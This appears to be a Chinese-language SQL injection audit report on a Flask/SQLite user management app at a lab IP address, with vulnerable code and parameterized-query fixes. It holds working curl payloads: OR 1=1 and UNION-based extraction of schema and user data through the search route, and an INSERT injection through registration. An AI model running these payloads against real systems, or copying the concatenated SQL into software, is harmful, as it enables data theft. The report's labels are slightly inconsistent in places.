# 用户管理系统 SQL注入漏洞审计报告

**目标：** http://192.168.119.128:5000
**应用：** 用户管理系统（Flask + SQLite3）
**审计日期：** 2026-07-08

---

## 漏洞概述

该系统在「今天优化」后新增/修改了多个功能，引入了严重的 SQL 注入漏洞。所有注入点均使用字符串拼接方式执行 SQL 语句，未使用参数化查询。

---

## 🔴 高危漏洞1：搜索功能 SQL注入（主页/搜索API）

### 漏洞代码

**文件：** `app.py`
**位置：** `index()` 路由（首页）和 `search()` 路由

```python
# app.py — 搜索功能（首页第44行 & search路由）
keyword = request.args.get("keyword", "").strip()
sql = f"SELECT * FROM users WHERE username LIKE '%{keyword}%' OR email LIKE '%{keyword}%'"
c.execute(sql)
```

### 攻击路径

```
GET /search?keyword=[注入载荷]
GET /?keyword=[注入载荷]
```

### PoC

```bash
# 基础注入 — 返回所有用户（OR 1=1）
curl "http://192.168.119.128:5000/search?keyword=test'%20OR%201=1--"

# 返回数据：
# {"results":[
#   {"email":"admin@example.com","id":1,"password":"***","username":"admin"},...
#   ...
#   {"email":"attacker.com","id":10,"password":"***","username":"attacker"}
# ],"keyword":"test' OR 1=1--"}

# 确认列数（5列）
curl "http://192.168.119.128:5000/search?keyword=test'%20UNION%20SELECT%201,2,3,4,5--"
# 返回 5 列数据
```

### 漏洞证明

```
请求：GET /search?keyword=test' OR 1=1--
结果：返回数据库中所有用户信息（10个用户）
危害：可遍历所有用户数据，包括管理员账户信息
```

---

## 🔴 高危漏洞2：注册功能 SQL注入

### 漏洞代码

**文件：** `app.py`
**位置：** `register()` 路由

```python
# app.py — 注册功能
@app.route("/register", methods=["GET", "POST"])
def register():
    username = request.form.get("username", "").strip()
    password = request.form.get("password", "")
    email = request.form.get("email", "").strip()
    phone = request.form.get("phone", "").strip()
    
    # 👇 直接拼接 SQL，完全未过滤！
    sql = f"INSERT INTO users (username, password, email, phone) VALUES ('{username}', '{password}', '{email}', '{phone}')"
    c.execute(sql)
```

### 攻击路径

```
POST /register
Content-Type: application/x-www-form-urlencoded

username=[注入载荷]&password=xxx&email=xxx&phone=xxx
```

### PoC

```bash
# 注入点：username 参数
# 利用注册插入恶意数据
curl -X POST "http://192.168.119.128:5000/register" \
  -d "username=test_hack', 'injected_pwd', 'hack@x.com', '99999'); --&password=***&email=y&phone=z"

# 响应：注册成功，请登录
```

### 漏洞证明

```
请求：POST /register  with username = "test_hack', 'injected_pwd', 'hack@x.com', '99999'); --"
结果：注册成功，恶意数据写入数据库
危害：攻击者可向数据库任意写入数据，包括覆盖已有记录、批量注册等
```

---

## 🟠 中危漏洞3：SQLite布尔盲注（信息窃取）

利用搜索功能的 UNION 注入，可以进一步提取数据库结构信息。

### 含数据窃取的 PoC

```bash
# 提取当前数据库中的所有表名
curl -s -G "http://192.168.119.128:5000/search" \
  --data-urlencode "keyword=test' UNION SELECT 1,GROUP_CONCAT(name),3,4,5 FROM sqlite_master WHERE type='table'--"

# 提取 users 表的所有列名
curl -s -G "http://192.168.119.128:5000/search" \
  --data-urlencode "keyword=test' UNION SELECT 1,GROUP_CONCAT(sql),3,4,5 FROM sqlite_master WHERE name='users'--"
```

---

## 优化前后的对比分析

### 优化前（`app.py.bak2` 版本）

```python
# 之前的版本：
# - 无数据库功能，无搜索，无注册
# - 用户数据硬编码在 USERS 字典中
# - login 使用明文密码比对（即使加密也是 bcrypt 较安全）
```

### 优化后（当前 `app.py`）

```python
# 新增功能及其引入的漏洞：
# 1. ✅ 数据库功能（SQLite）—— 引入注入入口
# 2. ✅ 搜索功能（主页 + /search）—— SQL注入
# 3. ✅ 用户注册功能（/register）—— SQL注入
# 4. ❌ 密码加密优化（bcrypt）—— ✅ 正确
# 5. ❌ Session安全优化（HttpOnly, SameSite）—— ✅ 正确
# 6. ❌ 动态secret key替换硬编码—— ✅ 正确
```

---

## 影响范围

| 项目 | 内容 |
|---|---|
| **漏洞总数** | 3个（2高1中） |
| **受影响数据** | 所有用户信息（username, email, phone, id） |
| **攻击前置条件** | 无需登录，无需认证 |
| **利用难度** | 低（无需特殊工具，curl即可利用） |
| **影响版本** | 当前所有版本 |

---

## 修复建议

### 根本修复：使用参数化查询

```python
# 搜索功能修复
keyword = request.args.get("keyword", "").strip()
sql = "SELECT * FROM users WHERE username LIKE ? OR email LIKE ?"
c.execute(sql, ('%' + keyword + '%', '%' + keyword + '%'))

# 注册功能修复
sql = "INSERT INTO users (username, password, email, phone) VALUES (?, ?, ?, ?)"
c.execute(sql, (username, password, email, phone))
```

### 补充修复

1. 限制 `/search` 接口的返回值数量，防止数据批量泄露
2. 注册功能中对密码进行哈希处理后再存储
3. 用户ID、密码字段在前端和后端均做脱敏处理
4. 添加 X-Content-Type-Options、CSP 等安全响应头

---

## 攻击链组合

```
注册功能SQL注入
    ↓
向数据库写入恶意数据
    ↓
搜索功能SQL注入
    ↓
提取所有用户信息
    ↓
利用管理员信息尝试登录后台
    ↓
获取完整系统控制权
```

---

*报告生成日期：2026-07-08*
*审计工具：手动代码审计 + SQL注入测试*
